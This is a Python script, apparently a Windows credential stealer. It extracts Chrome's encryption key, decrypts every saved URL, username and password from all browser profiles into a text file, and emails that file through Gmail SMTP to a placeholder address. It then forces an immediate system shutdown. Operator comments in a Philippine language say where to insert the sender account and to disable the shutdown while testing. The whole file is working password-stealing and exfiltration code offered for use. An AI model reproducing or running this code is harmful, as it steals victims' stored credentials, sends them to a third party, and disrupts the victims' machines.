
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
OUTPUT_FILE = "chrome_passwords.txt"

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[ERR] Unable to retrieve secret key: {e}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode()
    except Exception as e:
        return f"[ERR] Unable to decrypt password: {e}"

def fetch_passwords():
    try:
        secret_key = get_secret_key()
        if not secret_key:
            return "[ERR] Unable to fetch secret key."
        
        with open(OUTPUT_FILE, "w", encoding="utf-8") as file:
            profiles = [f for f in os.listdir(CHROME_PATH) if re.match(r"^Profile.*|Default$", f)]
            for profile in profiles:
                db_path = os.path.join(CHROME_PATH, profile, "Login Data")
                if not os.path.exists(db_path):
                    continue
                
                shutil.copy(db_path, "temp_Loginvault.db")
                conn = sqlite3.connect("temp_Loginvault.db")
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for url, username, ciphertext in cursor.fetchall():
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        file.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
                
                cursor.close()
                conn.close()
                os.remove("temp_Loginvault.db")
        
        print(f"Passwords saved to {OUTPUT_FILE}")
    except Exception as e:
        return f"[ERR] An error occurred: {e}"

def send_email_with_attachment(file_path, to_email):
    try:
        from_email = "HOST-EMAIL" # HOST EMAIL 
        password = "APP-PASSWORD" # NAAS MANAGE ACCOUNT MAKITA
        
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = "Chrome Passwords Backup" # YOU CAN CHANGE THIS ONE MOTHER FATHER
        msg.attach(MIMEText("Attached are the extracted Chrome passwords.", 'plain'))
        
        # Attach the file
        with open(file_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
        msg.attach(part)
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        server.send_message(msg)
        server.quit()
        
        print("Email sent successfully.")
    except Exception as e:
        print(f"[ERR] Failed to send email: {e}")
        return False
    return True

def shutdown_system(): # PWEDE RA NI WALAON ANG FUNCTION FOR TESTING, IBALIK LANG ONCE SUCCESS 
    try:
        print("Shutting down the system...")
        os.system("shutdown /s /t 0")  # Windows shutdown command   
    except Exception as e:
        print(f"[ERR] Failed to shut down the system: {e}")

if __name__ == "__main__":
    try:
        fetch_passwords()
        if send_email_with_attachment(OUTPUT_FILE, "SEND-TO-EMAIL"):
            shutdown_system()
    except Exception as e:
        print(f"[ERR] An error occurred during execution: {e}")
